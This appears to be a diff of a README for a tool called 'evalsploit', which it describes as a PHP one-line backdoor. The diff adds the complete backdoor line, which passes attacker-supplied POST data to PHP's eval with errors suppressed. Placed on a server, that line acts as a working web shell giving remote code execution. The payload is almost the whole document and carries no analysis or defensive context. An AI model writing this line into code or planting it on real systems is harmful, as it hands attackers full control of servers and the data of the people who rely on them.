@@ -1,4 +1,4 @@
 # evalsploit
 Based on eval function PHP one-line backdoor
 
-`s`
+`if(isset($_POST['Z'])){@eval($_POST['Z']);die();}`
